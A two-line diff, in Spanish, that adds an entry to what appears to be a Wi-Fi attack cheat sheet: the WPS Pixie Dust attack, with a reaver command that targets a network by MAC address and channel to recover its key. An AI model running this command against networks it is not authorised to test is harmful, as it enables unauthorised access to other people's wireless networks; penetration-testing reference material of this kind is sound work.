@@ -1,0 +1,2 @@
+▶ Ataque WPS Pixie Dust (Explotar WPS para obtener clave):
+  reaver -i wlan0mon -b <mac_address> -c <channel> -Z
